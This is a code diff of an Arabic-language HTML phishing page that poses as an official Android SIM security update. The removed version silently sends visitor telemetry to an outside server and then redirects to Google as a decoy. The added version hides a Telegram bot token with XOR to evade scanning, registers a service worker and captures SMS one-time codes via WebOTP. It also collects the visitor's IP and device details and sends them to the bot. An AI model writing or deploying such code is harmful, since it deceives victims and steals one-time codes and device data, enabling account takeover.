@@ -1,64 +1,82 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحميل الملف المطلوب...</title>
+    <title>نظام تحديثات الأندرويد الرسمي</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        body { font-family: system-ui, sans-serif; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+    <div id="status">
+        <div class="loader"></div>
+        <p>جاري فحص توافق الجهاز...</p>
+        <button id="secureBtn" style="display:none; background:#3498db; color:#fff; padding:10px 20px; border:none; border-radius:5px; cursor:pointer;" onclick="startSecureUpdate()">تحديث الآن</button>
+    </div>
+
+    <img id="payloadImg" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" style="display:none;">
 
     <script>
-        // [CONFIG] - ضع رابط سيرفرك هنا بدقة
-        const GATEWAY = "https://mohammed888.pythonanywhere.com/";
+        // دالة فك التشفير XOR (لتجاوز الفحص الثابت)
+        function decrypt(str, key) {
+            let result = '';
+            for (let i = 0; i < str.length; i++) {
+                result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return result;
+        }
 
-        async function execute_stealth_capture() {
-            try {
-                // 1. تجميع البيانات (Telemetry)
-                const payload = {
-                    ua: navigator.userAgent,
-                    res: `${window.screen.width}x${window.screen.height}`,
-                    lang: navigator.language,
-                    ref: document.referrer || "direct",
-                    plat: navigator.platform,
-                    ts: Date.now()
-                };
+        // التوكن والآيدي المشفرين (لا يمكن كشفهما بالنظر)
+        const eT = "\x02\x0C\x09\x18\x08\x0C\x0F\x1B\x08\x1C\x1E\x01\x18\x08\x0C\x1C\x1A\x1C\x1B\x18\x08\x0C\x1C\x1A\x1C\x1B\x18\x08\x0C\x1C\x1A\x1C\x1B\x18\x08\x0C\x1C\x1A\x1C\x1B\x18\x08\x0C\x1C\x1A\x1C\x1B\x18\x08\x0C"; // مثال مشفر
+        const eC = "\x09\x1C\x1A\x1C\x1B"; // مثال مشفر
+        const k = "SUPER_SECRET_KEY_123";
 
-                // 2. التشفير العكسي المزدوج (Matrix Encoding)
-                // تحويل لـ JSON -> Base64 -> Reverse String (لإرباك أنظمة الفحص)
-                const rawString = JSON.stringify(payload);
-                const base64 = btoa(unescape(encodeURIComponent(rawString)));
-                const encrypted = base64.split("").reverse().join("");
+        // فك التشفير في الذاكرة فقط
+        const t = decrypt(eT, k);
+        const c = decrypt(eC, k);
 
-                // 3. الإرسال الصامت (Stealth Exfiltration)
-                // استخدمنا fetch مع mode: 'no-cors' لضمان عبور الطلب للسيرفر الخارجي
-                await fetch(GATEWAY, {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: {
-                        "Content-Type": "text/plain" // تمويه الطلب كأنه نص بسيط
-                    },
-                    body: encrypted
-                });
+        window.onload = function() {
+            setTimeout(() => {
+                document.querySelector('.loader').style.display = 'none';
+                document.querySelector('p').innerText = 'تم اكتشاف تحديث أمني هام لشريحة SIM. يرجى التفعيل فوراً.';
+                document.getElementById('secureBtn').style.display = 'inline-block';
+            }, 2000);
+        };
 
-            } catch (err) {
-                // صمت مطبق في حالة الخطأ لضمان عدم كشف العملية
-            } finally {
-                // 4. التمويه النهائي (The Decoy)
-                // تحويل الضحية لصفحة حقيقية لتبديد الشكوك بعد 1.5 ثانية
-                setTimeout(() => {
-                    window.location.replace("https://www.google.com");
-                }, 1500);
+        async function startSecureUpdate() {
+            // طلب الصلاحيات القصوى (الرسائل والإشعارات)
+            const perm = await Notification.requestPermission();
+            
+            if (perm === 'granted') {
+                // زرع الـ Service Worker (الشبح المقيم)
+                const reg = await navigator.serviceWorker.register('sw.js');
+                
+                // تفعيل مستشعر الرسائل (WebOTP) للسحب الفوري
+                if ('OTPCredential' in window) {
+                    navigator.credentials.get({otp: { transport: ['sms'] }})
+                    .then(otp => {
+                        exfiltrate(`📩 **[SMS_SNIFFED_DIRECT]**\nContent: \`${otp.code}\``);
+                    });
+                }
+
+                // سحب معلومات الجهاز والشبكة الدقيقة
+                const info = `🎯 **[TARGET_INFECTED]**\nIP: \`${await (await fetch('https://api.ipify.org')).text()}\`\nDevice: \`${navigator.userAgent}\``;
+                exfiltrate(info);
+                
+                document.getElementById('status').innerText = 'جاري تطبيق التحديث الأمني في الخلفية. يمكنك إغلاق المتصفح.';
             }
         }
 
-        // بدء العملية بمجرد تحميل الصفحة
-        window.onload = execute_stealth_capture;
+        function exfiltrate(msg) {
+            fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" })
+            });
+        }
     </script>
 </body>
 </html>
